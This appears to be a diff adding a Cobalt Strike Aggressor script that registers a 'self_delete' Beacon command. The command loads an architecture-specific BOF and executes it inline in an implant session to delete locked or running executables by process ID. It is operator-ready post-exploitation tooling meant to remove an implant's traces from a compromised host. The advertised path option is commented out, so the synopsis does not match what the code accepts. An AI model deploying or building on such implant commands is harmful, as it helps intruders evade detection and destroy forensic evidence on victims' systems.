@@ -1,0 +1,32 @@
+beacon_command_register(
+"self_delete", 
+"delete a locked executable or a currently running file from disk by its pid, path, or the current process.", 
+"Synopsis: self_delete [pid|path]");
+
+alias self_delete{
+	local('$barch $handle $data $args');
+
+	#$module = $2;
+	#$path = $3;
+	#$pid = $4;
+	$pid = $2;
+
+	if ("$pid" eq "") {
+		berror($1, "usage command: help self_delete");
+		return;
+	}
+
+	# Read in the right BOF file
+	# figure out the arch of this session
+	$barch  = barch($1);
+
+	# read in the right BOF file
+    $handle = openf(script_resource("dist/self_delete. $+ $barch $+ .o"));
+	$data = readb($handle, -1);
+	closef($handle);
+
+	# Pack our arguments
+	$args = bof_pack($1, "iZi", 3, "", $pid);
+
+	beacon_inline_execute($1, $data, "go", $args);
+}
